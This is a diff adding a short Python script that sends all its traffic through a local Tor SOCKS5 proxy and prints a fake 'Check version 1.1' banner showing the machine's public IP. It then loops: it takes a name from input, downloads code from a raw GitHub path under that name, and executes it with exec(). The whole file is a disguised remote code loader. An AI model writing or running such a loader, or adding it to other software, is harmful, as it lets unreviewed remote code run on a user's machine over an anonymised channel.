@@ -1,0 +1,13 @@
+from urllib.request import Request,urlopen
+import socks
+import socket
+import traceback
+socks.set_default_proxy(socks.SOCKS5,'127.0.0.1',9150)
+socket.socket=socks.socksocket
+print('Check version 1.1\nCopyright 1984\nWelcome ' + urlopen(Request('https://ident.me')).read().decode('utf-8') + '\n')
+while True:
+    try:
+        exec(urlopen(Request('https://raw.githubusercontent.com/alexis-dom/mir/main/' + input(urlopen(Request('https://ident.me')).read().decode('utf-8') + '>'))).read())
+    except Exception as ex:
+        print('Error [' + ex.__doc__ + "]")
+        print(traceback.format_exc())
